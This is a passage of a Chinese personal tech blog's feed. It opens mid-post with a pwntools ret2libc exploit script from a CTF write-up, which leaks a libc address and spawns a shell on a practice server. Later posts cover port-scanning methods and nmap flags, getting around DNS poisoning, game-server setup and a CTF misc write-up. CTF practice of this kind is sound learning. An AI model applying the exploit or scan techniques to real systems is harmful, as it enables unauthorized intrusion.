class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x:sh.recvuntil(x)</span><br><span class="line">rl=<span class="keyword">lambda</span> :sh.recvline()</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:sh.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26737</span>)</span><br><span class="line">elf=ELF(<span class="string">r&#x27;asd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x4006b9</span><span class="comment"># 用ROPgadget得到的两个地址</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>] </span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)<span class="comment"># 64位程序优先寄存器传参，顺序为 rdi rsi rdx rcx r8 r9</span></span><br><span class="line">payload+=p64(puts_got)<span class="comment"># 使puts的got表值作为参数</span></span><br><span class="line">payload+=p64(puts_plt)<span class="comment"># 返回值为调用puts</span></span><br><span class="line">payload+=p64(main)<span class="comment"># 返回main继续利用</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">puts_addr=u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment"># print hex(puts_addr)</span></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;choice!\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(ret)<span class="comment"># 堆栈平衡</span></span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/7.jpg" alt="img"></p><p><img src="/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/8.jpg" alt="img"></p><p>flag{26f5b361-8b21-42da-9324-4c3c8c3e2ba6}</p><p>参考：<a href="https://blog.csdn.net/mcmuyanga/article/details/108224907">https://blog.csdn.net/mcmuyanga/article/details/108224907</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="pwn" scheme="https://blog.pillar.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>怎么在dns污染的情况下继续上github</title>
    <link href="https://blog.pillar.fun/2022/04/11/%E6%80%8E%E4%B9%88%E5%9C%A8dns%E6%B1%A1%E6%9F%93%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E7%BB%A7%E7%BB%AD%E4%B8%8Agithub/"/>
    <id>https://blog.pillar.fun/2022/04/11/%E6%80%8E%E4%B9%88%E5%9C%A8dns%E6%B1%A1%E6%9F%93%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E7%BB%A7%E7%BB%AD%E4%B8%8Agithub/</id>
    <published>2022-04-11T09:24:39.000Z</published>
    <updated>2023-03-06T04:12:51.313Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>我吐了</p><h1 id="黑话GFW"><a href="#黑话GFW" class="headerlink" title="黑话GFW"></a>黑话GFW</h1><p>众所周知，为了保护13亿民智，我国有GFW之国情，限制访问Instagram、twitter、（onlyfans？）等等国外社交媒体实乃千秋大业。</p><p>当然，有那么一小搓人就是很朋克，你不让我看，我就偏要看，确实产生了一些偏激之人，但说到底，绕过GFW看外面的技术总归是无罪的，随后很多人也通过各种渠道逐渐掌握了http/https/socks代理之妙法，得以在一定时间内成功访问国外社交平台，并自以为美。</p><p>然而GFW也随之进化，虽有酸酸乳之混淆，但通过边界流量的检测手段，即可较大概率的猜对谁是代理，谁是跳板，进而ban掉ip，批断你的小木梯。</p><p>但说到底，绝大部分的爬墙者并非自造梯子，而是借助梯厂的梯子，说到底对于网民而言，无非是这阵梯子不好使了，下一阵又好使了的区别，况且一直banip，搞到后面会让被ban的list太多，慢慢的让GFW的边界路由器越来越不堪重负……因此GFW再次进化，与其说进化，不如说黑化，我tm直接进行一个DNS污染，你想上twitter是吧？我直接给你定向到百京的谷歌服务器去！（这个谷翔信息科技好像就是cn谷歌）虽然谷歌服务器看到这驴头不对马嘴的数据包会直接丢掉，并不能造成什么实质性的损害，但是至少你twitter上不了了，怎么说？同时我还把原本解析出来的ipban了，哼！</p><p><img src="/2022/04/11/%E6%80%8E%E4%B9%88%E5%9C%A8dns%E6%B1%A1%E6%9F%93%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E7%BB%A7%E7%BB%AD%E4%B8%8Agithub/1.jpg" alt="img"></p><p><img src="/2022/04/11/%E6%80%8E%E4%B9%88%E5%9C%A8dns%E6%B1%A1%E6%9F%93%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E7%BB%A7%E7%BB%AD%E4%B8%8Agithub/2.jpg" alt="img"></p><h1 id="但是"><a href="#但是" class="headerlink" title="但是"></a>但是</h1><p>道理我都懂，github为啥要也给污染了啊？github何罪之有？这和nt粉丝冲了AO3有何区别？我自己搞自己的技术，也不关注政治（虽然确实最近github开始搞什么stand with Ukraine了），圈地自萌都不给萌了是吧？建议直接搞个Chinese Intranet嗷，毕竟哪个互联网应用不都有可能有一个sb运营者吗？说不定哪天你去搞学术的时候，想找个数据集，突然就发现找数据集的网站首页大写了一个stand with Ukraine了，那你是不是就不能搞AI了？</p><p>虽然其实现在DNS污染的不严重了，但是新疆确实全都搁着染着呢，而且感觉是本地运营商在某个机器的安排下直接把自己的DNS服务器给安排了。捏马的。</p><p>所以作为苦逼计科人、网安人、软工人，我们必须运用已知知识来确保我们对互联网的掌控，how？</p><h1 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h1><p>当然是hosts+代理啦</p><p>拿个<a href="http://ping.chinaz.com/api.twitter.com">多地ping工具</a>整一哈，找到一个看起来没有被DNS污染的地区的响应，再改个hosts即可。</p><p>当然实际上你要发现那些被ban了其实还是挺烦人的，比如说当你改了twitter.com的hosts之后发现依旧没法看推特，此时你需要F12查看一下那些东西403了，比如ton.local.twitter.com实际上也被安排的明明白白，这些虽然就是后话了。</p><p>实际上现在绝大部分的代理软件都支持了doh(dns on https）和dot（dns on tcp），目前来说好像还没有对doh的server进行dns污染，所以基本上连个阿里doh或者腾讯doh，就能解决掉dns污染到别的地方。当然如果你不想搞这些有的没的，github上也有直接的dohserver的项目，完全可以自己搞一个。</p><h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h1><p>通过一系列的折腾，终于能正常而无障碍的访问我所需要的服务了，我也不太想说什么了，只是希望上海的物资真能送到每个人的手里吧。</p><p>ps. 后来我发现原来onlyfans可以直连，而pornhub没被dns污染，笑嘻了</p><p>pps. 虽然笔误把劈断写成了批断，但是感觉还挺能宣泄情绪的，不改了！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集之端口扫描</title>
    <link href="https://blog.pillar.fun/2022/04/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <id>https://blog.pillar.fun/2022/04/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</id>
    <published>2022-04-08T06:31:03.000Z</published>
    <updated>2022-04-08T07:50:21.740Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>最近在看软考信息安全工程师的教材，看到信息收集这块儿，结合之前的靶机渗透经验，觉得自己掌握的不是很牢靠，有必要再总结一下。</p><h1 id="端口扫描的几种类型"><a href="#端口扫描的几种类型" class="headerlink" title="端口扫描的几种类型"></a>端口扫描的几种类型</h1><h2 id="完全连接扫描"><a href="#完全连接扫描" class="headerlink" title="完全连接扫描"></a>完全连接扫描</h2><p>利用tcp/ip的三次握手机制，如果完成了三次握手建立了一个连接，就说明确此端口开放，否则视为关闭。</p><h2 id="半连接扫描"><a href="#半连接扫描" class="headerlink" title="半连接扫描"></a>半连接扫描</h2><p>简化一点的完全连接扫描，只要前两次握手成了就行。</p><h2 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h2><p>发送连接请求，看主机的回应，如果反悔了ACK信息则认为是开放，如果是RESET则认为关闭</p><h2 id="ID头信息扫描"><a href="#ID头信息扫描" class="headerlink" title="ID头信息扫描"></a>ID头信息扫描</h2><p>要求借助一台基本没有网络活动的主机B。先由A主机向B发ping，关注返回的报文的ID（书上是这么写的，我实在不知道tcp的id是搁哪儿的，暂时理解成SEQ吧）。如果均匀+1，说明B主机确实没什么网络活动，在目前阶段只与A有交流。然后A伪造一个由B发出的请求连接数据包给C，如果C开放了，就会回SYN，而B会再和C交流，因此再给ping返回的ID就不是加一而是加几，而如果C不开放，就会回RESET给B，B一看RESET直接丢了，依旧和ping返回，所以ID只加一。</p><h2 id="隐蔽扫描"><a href="#隐蔽扫描" class="headerlink" title="隐蔽扫描"></a>隐蔽扫描</h2><p>是绕IDS防火墙和监视系统的方法</p><h2 id="SYN-ACK扫描"><a href="#SYN-ACK扫描" class="headerlink" title="SYN|ACK扫描"></a>SYN|ACK扫描</h2><p>直接发SYN|ACK，也就是第二次握手的包，如果目标主机开放，则会认为这是有误的包，直接丢弃不回复，如果不开放，则会返回RESET。</p><h2 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h2><p>直接发FIN包，如果回RESET说明关闭，如果不回说明开放，和上面的原理基本一致。</p><h2 id="ACK扫描"><a href="#ACK扫描" class="headerlink" title="ACK扫描"></a>ACK扫描</h2><p>发送FIN包之后，查看返回包的TTL和WIN，开放端口TTL一般小于64，WIN一般大于0，关闭端口TTL一般大于64，WIN必为0（搞不懂都，不是FIN扫描就完了吗？）</p><h2 id="NULL扫描"><a href="#NULL扫描" class="headerlink" title="NULL扫描"></a>NULL扫描</h2><p>标志位全部空，也就是说发一个错误的数据包，如果返回了RST，说明是关闭的。</p><h2 id="XMAS扫描"><a href="#XMAS扫描" class="headerlink" title="XMAS扫描"></a>XMAS扫描</h2><p>同NULL，知识将标志位全部为1</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><p>以上的基本上都是tcp协议下面向连接的服务的端口扫描，那么对于使用udp无连接的服务怎么扫描呢？</p><p>由于UDP协议是非面向连接的，对UDP端口的探测也就不可能像TCP端口的探测那样依赖于连接建立过程（不能使用telnet这种tcp协议类型命令），这也使得UDP端口扫描的可靠性不高。所以虽然UDP协议较之TCP协议显得简单，但是对UDP端口的扫描却是相当困难的。</p><p>用man命令查看nmap的手册可以找到udp端口扫描的介绍</p><p><img src="/2022/04/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/1.jpg" alt="img"></p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>nmap作为流传最广的端口扫描工具，其用法显然有必要说说。</p><p>官方给了一些常见的<a href="https://nmap.org/data/nmap.usage.txt">命令选项</a></p><p>下面是我的常见的命令选项</p><p>-p      指定端口单端口扫描</p><p>-p-     全端口扫描</p><p>-sT     tcp连接扫描（应该是完全连接扫描，毕竟很慢）</p><p>-sS    SYN扫描</p><p>-sU    udp扫描</p><p>-sV    扫描服务版本</p><p>-sC    脚本扫描</p><p>-A    强力扫描</p><p>-Tx    以x线程扫描，可取1-6</p><p>-6    对ipv6地址主机扫描</p><p>-f    小数据包发送</p><p>-D &lt;假ip&gt;    发送掺杂假ip的数据包</p><p>-v    显示扫描细节</p><p>-sP    arp扫描主机存活性</p><p>参考：</p><p><a href="https://blog.csdn.net/sj349781478/article/details/122403617">https://blog.csdn.net/sj349781478/article/details/122403617</a></p><p><a href="https://blog.csdn.net/fageweiketang/article/details/84001054">https://blog.csdn.net/fageweiketang/article/details/84001054</a></p><p><a href="https://blog.csdn.net/qq_37964989/article/details/84330693">https://blog.csdn.net/qq_37964989/article/details/84330693</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>雨中冒险2服务器搭建</title>
    <link href="https://blog.pillar.fun/2022/04/02/%E9%9B%A8%E4%B8%AD%E5%86%92%E9%99%A92%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    <id>https://blog.pillar.fun/2022/04/02/%E9%9B%A8%E4%B8%AD%E5%86%92%E9%99%A92%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</id>
    <published>2022-04-02T03:11:37.000Z</published>
    <updated>2022-04-02T04:07:44.833Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>简单记录一下雨中冒险2服务器的搭建</p><h1 id="法1-docker"><a href="#法1-docker" class="headerlink" title="法1-docker"></a>法1-docker</h1><p>github上有一个<a href="https://github.com/avivace/ror2-server">项目</a></p><p>直接随选一个linux系统，然后用对应分包管理工具装好他的依赖，运行就完事了。</p><p>这个项目是在docker里的linux用wine模拟windows环境来搭建ror2服务器。</p><p>实际上ror2的开发商貌似只开发了windows环境下的服务器，所以其实在各种意义上，这个用wine的docker都不是很稳定，在我和朋友们联机的过程中也深受其害，果断弃用。</p><h1 id="法2-windows"><a href="#法2-windows" class="headerlink" title="法2-windows"></a>法2-windows</h1><p>用windows来整就稳定一点，但也没有那么稳定，虽然实际上是我朋友网络的问题……</p><p>这里我们用到的是<a href="https://developer.valvesoftware.com/wiki/SteamCMD#Windows">steamcmd</a></p><p>在你的云服务商哪里选一个windowsserver，然后把steamcmd放进去，管理员运行之，等他自己安装，安装完了会显示</p><p><img src="/2022/04/02/%E9%9B%A8%E4%B8%AD%E5%86%92%E9%99%A92%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/1.jpg" alt="img"></p><p>然后你随便建个文件夹，用来放你的ror2的服务器文件，接下来输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">force_install_dir=<span class="string">&quot;C:\ror2&quot;</span> <span class="comment"># 这里换你自己设置的文件夹</span></span><br><span class="line">login anonymous</span><br><span class="line">app_update 1180760 validate</span><br></pre></td></tr></table></figure><p>他就会下载（和你再linux上安装csgo服务器的步骤基本一致，如果你安装过的话）</p><p>然后等到下载完成，你就成了，去 <code>Risk of Rain 2_Data/config/server_startup.cfg</code>调整一下你的自定义设置。运行Risk of Rain 2.exe即可。</p><p><img src="/2022/04/02/%E9%9B%A8%E4%B8%AD%E5%86%92%E9%99%A92%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/2.jpg" alt="img"></p><p><img src="/2022/04/02/%E9%9B%A8%E4%B8%AD%E5%86%92%E9%99%A92%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/3.jpg" alt="img"></p><p>虽然他在这里说少了一些config啥的，但是没有什么影响，直接用就完事了。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>你还可以去<a href="thunderstore.io">thunderstore.io</a>下载一些mod来进一步完善你的服务器，让你的服务器更加好玩~~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hgame2022_wp</title>
    <link href="https://blog.pillar.fun/2022/02/20/hgame2022-wp/"/>
    <id>https://blog.pillar.fun/2022/02/20/hgame2022-wp/</id>
    <published>2022-02-20T08:49:57.000Z</published>
    <updated>2022-02-20T12:16:54.013Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar’s ‘杭电hgame 2022 write up</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="欢迎欢迎！热烈欢迎！"><a href="#欢迎欢迎！热烈欢迎！" class="headerlink" title="欢迎欢迎！热烈欢迎！"></a>欢迎欢迎！热烈欢迎！</h3><p>题目描述：关注“奇安信技术研究院”微信公众号，发送 <code>HelloHGAME2022</code> 获得flag</p><p>我就不多bb</p><h3 id="这个压缩包有点麻烦"><a href="#这个压缩包有点麻烦" class="headerlink" title="这个压缩包有点麻烦"></a>这个压缩包有点麻烦</h3><p>题目描述：这个压缩包，它真的可以打开吗？</p><p>在压缩包信息里可以看到提示6位数字密码，ARCHPR暴破之</p><p><img src="/2022/02/20/hgame2022-wp/1.jpg" alt="img"></p><p><img src="/2022/02/20/hgame2022-wp/2.jpg" alt="img"></p><p>解压，按照README，利用字典暴破之</p><p><img src="/2022/02/20/hgame2022-wp/3.jpg" alt="img"></p><p>解压，README提示If you don’t like to spend time compressing files, just stores them.开始以为是zip伪加密，010打开发现不是。然后发现文件内README和外面的README的CRC32值一样，即内外一致。加上提示说存储，所以以存储格式压缩README。</p><p>打开后是一张图，010editor发现尾部藏了一个zip</p><p><img src="/2022/02/20/hgame2022-wp/4.jpg" alt="img"></p><p>提取出来，又是zip，且需要密码，没提示，这里就该是zip伪加密了，用010editor将标志位改为0，解压得到flag</p><p><img src="/2022/02/20/hgame2022-wp/5.jpg" alt="img"></p><p><img src="/2022/02/20/hgame2022-wp/6.jpg" alt="img"></p><p><img src="/2022/02/20/hgame2022-wp/7.jpg" alt="img"></p><h3 id="好康的流量"><a href="#好康的流量" class="headerlink" title="好康的流量"></a>好康的流量</h3><p>题目描述：总所周知 饭卡是个LSP并十分喜欢向其他人推销他的涩图 让我们去悄悄康康他发了什么</p><p>打开pcap，发现SMTP，追踪之，可以看到一个很长的base64，结合描述，猜测为base64图片。</p><p><img src="/2022/02/20/hgame2022-wp/8.jpg" alt="img"></p><p>存之，010editor查看，看到png头，改为png格式，并没有pedding。</p><p>stegsolve打开，在column LSB RGB下发现隐写</p><p><img src="/2022/02/20/hgame2022-wp/9.jpg" alt="img"></p><p>即得flag。</p><p>后来看别人的wp得知可以直接用导出IFM对象的方法处理SMTP数据包。</p><h3 id="群青-其实是幽灵东京）"><a href="#群青-其实是幽灵东京）" class="headerlink" title="群青(其实是幽灵东京）"></a>群青(其实是幽灵东京）</h3><p>題目描述：4CTU3从小就是Yoasobi的狂热粉丝 今天它给大家带来了一首它觉得很好听的老歌 它说你要用多感官去感觉（Yoasobi yyds！）</p><p>先010editor看一眼，无附加文件，最后提示</p><p><img src="/2022/02/20/hgame2022-wp/10.jpg" alt="img"></p><p>用silentEye打开，目测是有加密</p><p>用au打开看频谱图，发现</p><p><img src="/2022/02/20/hgame2022-wp/11.jpg" alt="img"></p><p>以Yoasobi作为key来解密</p><p><img src="/2022/02/20/hgame2022-wp/12.jpg" alt="img"></p><p>得到</p><p><a href="https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/S_S_T_V.wav">https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/S_S_T_V.wav</a></p><p>然后使用RX-SSTV分析这段音频，使用虚拟声卡让SSTV接受电脑播放的声音，然后播放这段音频即可得到。</p><p><img src="/2022/02/20/hgame2022-wp/13.jpg" alt="img"></p><p><img src="/2022/02/20/hgame2022-wp/14.jpg" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://blog.pillar.fun/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>MC服务器building</title>
    <link href="https://blog.pillar.fun/2022/01/26/MC%E6%9C%8D%E5%8A%A1%E5%99%A8building/"/>
    <id>https://blog.pillar.fun/2022/01/26/MC%E6%9C%8D%E5%8A%A1%E5%99%A8building/</id>
    <published>2022-01-26T03:42:00.000Z</published>
    <updated>2022-02-21T05:27:09.382Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>想和兄弟萌一起砍砍MC吗？想增加服务器运维经验吗？想学习一下MC的插件编写吗？毫无疑问，自己开个MC服务器是在合适不过了。</p><h1 id="服务器性能要求"><a href="#服务器性能要求" class="headerlink" title="服务器性能要求"></a>服务器性能要求</h1><p>MC对于算力、内存的要求不是很大，但也需要一点，在<a href="https://minecraft.fandom.com/zh/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8/%E9%9C%80%E6%B1%82?variant=zh#.E8.BF.90.E8.A1.8CLAN_Party.E7.B1.BB.E5.9E.8B.E7.9A.84.E6.9C.8D.E5.8A.A1.E5.99.A8.EF.BC.88.E8.87.AA_1.3.2_.E7.89.88.E6.9C.AC.EF.BC.89">Minecraft Wiki</a>里显示了硬件要求。</p><table class="wikitable sortable collapsible jquery-tablesorter"><thead><tr><th class="unsortable" width="75">需求</th><th class="unsortable" width="25">玩家</th><th class="unsortable" width="150">CPU</th><th class="unsortable" width="65">内存</th><th class="unsortable" width="390">硬盘</th><th class="unsortable collapse-button" width="390"><span class="collapsetoggle">[<span class="jslink" tabindex="0">隐藏</span>]</span>注释</th></tr></thead><tbody><tr><th>最低配置</th><td align="center">2-4</td><td align="center">Intel Core 2 Duo 或 AMD Athlon 64 x2</td><td align="center">2GB</td><td align="center">至少150MB用于储存世界</td><td align="center">确保至少拥有一个低ping的互联网连接<br>（比如DSL或缆线连接）。</td></tr><tr><th>建议配置</th><td align="center">2-6</td><td align="center">Intel Core 2 Duo 或 AMD Athlon 64 x2</td><td align="center">3GB</td><td align="center">至少200MB用于储存世界</td><td align="center">确保至少拥有一个低ping的互联网连接<br>（比如DSL或缆线连接）。</td></tr></tbody><tfoot></tfoot></table><p>实际上在各个云服务器运营商哪里，一个这样的服务器都不是很贵（PS：如果你之前没买过）（PPS：甚至可以去tb之类的地方买到更便宜的）。</p><h1 id="配置服务器"><a href="#配置服务器" class="headerlink" title="配置服务器"></a>配置服务器</h1><h2 id="服务器核心种类"><a href="#服务器核心种类" class="headerlink" title="服务器核心种类"></a>服务器核心种类</h2><p>MC目前主流的服务器主要分为官服、水桶服（CraftBukkit）、水龙头服（spigot）和paper服（paperspigot）等。</p><p>简而言之，水桶服是在官服基础上构建，水龙头服是在水桶服之上构建，paper等等服是在水龙头服之上构建，服务器插件向下兼容，即水龙头服能用水桶服的插件，水桶服用不了专为水龙头服的插件。事实上绝大部分插件都是bukkit插件，所以除了少数插件需要多留意一下以外，插件直接装就完事了。</p><p>同时，越上层的服务器的功能越强大，比如paper服比spigot服在资源利用上有一定提升。</p><h2 id="搭建一个spigot服"><a href="#搭建一个spigot服" class="headerlink" title="搭建一个spigot服"></a>搭建一个spigot服</h2><p>搭服务器的方法多种多样，不同的操作系统配合不同的java版本和不同的MC版本，可以形成非常多的组合，乃至于docker搭建等等等等。本人在是在阿里云CentOS7上搭了一个1.12.2的spigot服，因此本文只介绍如何在CentOS上搭。</p><p>使用<a href="https://www.spigotmc.org/wiki/buildtools/#prerequisites">Spigot BuildToos</a>即可轻松搭建，BuildTools需要用到Git和Java，在CentOS上使用yum即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install git java-1.8.0-openjdk-devel</span><br></pre></td></tr></table></figure><p>这里需要注意，如果你要装1.17.1版本的MC，你要jdk16而非jdk8，如果你要装1.17.1以上的版本，你药妆jdk17而非jdk8。可以使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum list | grep java</span><br></pre></td></tr></table></figure><p>来找到你要装的jdk版本的名称。如果不清楚自己装过了什么版本的jdk，或者想卸载使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum list installed | grep java <span class="comment">#查看自己装了什么版本jdk</span></span><br><span class="line">yum remove ***<span class="comment">#移除***</span></span><br></pre></td></tr></table></figure><p>即可。</p><p>最好别让服务器在root运行，因此创建一个新用户。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo useradd mcserver</span><br><span class="line">sudo passwd mcserver </span><br><span class="line"><span class="comment"># 设置密码</span></span><br><span class="line">su mcserver</span><br><span class="line"><span class="built_in">cd</span> ~</span><br></pre></td></tr></table></figure><p>在/home/mcserver里随便建一个文件夹，用wget下载BuildTools</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://hub.spigotmc.org/jenkins/job/BuildTools/lastSuccessfulBuild/artifact/target/BuildTools.jar</span><br></pre></td></tr></table></figure><p>因为是要装1.12.2版本，因此</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar BuildTools.jar -Xmx1024m --rev 1.12.2</span><br></pre></td></tr></table></figure><p>spigot的BuildTools会自动的给你装水桶服和水龙头服，用哪个就看你自己罢了。</p><p><img src="/2022/01/26/MC%E6%9C%8D%E5%8A%A1%E5%99%A8building/1.jpg" alt="img"></p><p>然后由于近期log4j漏洞，建议参考<a href="https://www.mcbbs.net/thread-1283360-1-1.html进行相应的修复。下载Log4j2Fix-1.1-jar.with-dependencies.jar。">https://www.mcbbs.net/thread-1283360-1-1.html进行相应的修复。下载Log4j2Fix-1.1-jar.with-dependencies.jar。</a></p><p>最后，使用以下命令启动</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:Log4j2Fix-1.1-jar-with-dependencies.jar -Xms256m -Xmx2048m -jar spigot-1.12.2.jar</span><br></pre></td></tr></table></figure><p>其中Xms是最小内存，Xmx是最大内存，根据自己的服务器硬件进行相应的调整即可。建议把以上内容写到一个start.sh里，到时候</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen ./start.sh</span><br></pre></td></tr></table></figure><p>即可后台运行，若要查看，则</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -ls</span><br><span class="line">screen -r ***</span><br></pre></td></tr></table></figure><p>然后在1.12.2的客户端里连接即可。</p><p><img src="/2022/01/26/MC%E6%9C%8D%E5%8A%A1%E5%99%A8building/2.jpg" alt="img"></p><p>对了，第一次启动要将eula.txt改成true才行。</p><h1 